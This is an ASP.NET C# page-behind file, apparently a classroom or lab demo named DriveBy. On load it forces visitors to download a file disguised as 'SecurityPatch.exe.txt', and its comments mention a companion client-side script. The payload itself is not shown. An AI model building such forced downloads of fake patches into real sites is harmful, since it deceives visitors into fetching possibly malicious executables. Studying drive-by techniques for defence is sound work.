using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class DriveBy : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        //This is the code for downloading, it works for downloading, but together with the client side script, it doesn't work.
        //So please use this code to download the file first then comment all this code and run this page again.
        Response.ContentType = "application/octet-stream";
        Response.AppendHeader("Content-Disposition", "attachment; filename=SecurityPatch.exe.txt");
        Response.TransmitFile(Server.MapPath("~/images/SecurityPatch.exe.txt"));
        Response.End();
    }
}